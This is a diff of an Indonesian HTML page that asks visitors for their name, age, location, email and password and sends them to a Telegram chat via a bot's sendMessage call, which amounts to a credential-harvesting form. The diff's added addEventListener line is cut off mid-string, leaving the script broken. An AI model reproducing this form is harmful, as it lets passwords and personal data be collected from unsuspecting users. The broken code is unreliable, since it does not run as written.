@@ -11,7 +11,7 @@
     <p>Sebelum Mencobanya Kalian Harus Gabung Grup Telegram <a href="https://t.me/gtelegramtester" target="_parent">Ini</a></p>
     <p>Silahkan Pilih Formulir Wajib Diisi Atau Opsional :</p>
     <br>
-    <form>
+    <form id="fm">
       <label>Nama :</label>
       <br>
       <input id="nama" type="name" placeholder="Masukkan Nama" required></input>
@@ -38,7 +38,7 @@
       <br>
       <input type="password" id="kata_sandi" placeholder="Masukkan Kata Sandi" required></input>
       <br>
-      <input onclick="return sendText();" id="submit" type="submit"></input>
+      <input type="submit"></input>
     
     </form>
     <script>
@@ -62,6 +62,7 @@ var kata_sandi = document.getElementById('kata_sandi')
       var result = "\nNama : " + nama + "\nUmur : " + umur + "\nLokasi : " + lokasi + "\nEmail : " + email + "\nKata Sandi : " + kata_sandi
       // Fungsi untuk mengirim pesan teks
       function sendText() {
+        document.getElementById('fm').addEventListener("
         const message = result
         if (message) {
           telegramRequest('sendMessage', { chat_id: chatId, text: message });
